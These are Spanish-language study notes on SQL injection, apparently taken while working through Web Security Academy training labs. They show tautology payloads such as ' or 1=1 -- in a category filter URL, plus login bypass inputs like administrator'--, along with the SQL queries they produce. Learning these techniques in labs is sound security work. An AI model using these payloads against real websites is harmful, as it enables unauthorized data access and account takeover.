SQL Injection

 Una inyección SQL bien colocada en una cláusula WHERE permite acceder a datos que deberían estar ocultos. Es una de las formas más básicas y efectivas de explotación.

La consulta basica es romper con ' la query que se forma para poder crear nuestra propia consulta

```
ejemplo 

web-security-academy.net/filter?category=tets'or 1=1 -- 
Con esto ignoramos todo lo que este despues del paramaetro catagoria y como se hace un or category=tets'or 1=1 obtenemos todas las categorias sin importar cual sea 

https://0aa3003b04418ff480a3f3420007001d.web-security-academy.net/filter?category=test' or 1=1 and released=0--
```

Tambien se puede utilizar en los formularios de autenticacion en el apartada password

```
Es importante entender que se busca modificar la parte condicional comentando el resto de la query para tomar control de esta

En el user 
administrator'-- 

En el pass
test' or 1=1 -- -

Lo que estaria pasando a nivel de query es

SELECT * FROM users WHERE username='administrator'--' and password='loque sea'  al pasar por parametro administrator'-- , lo que pasa es que ignora la parte del pass

En el otro caso seria 
SELECT username FROM users WHERE username='administrator' and password='test' or 1=1 -- -'
```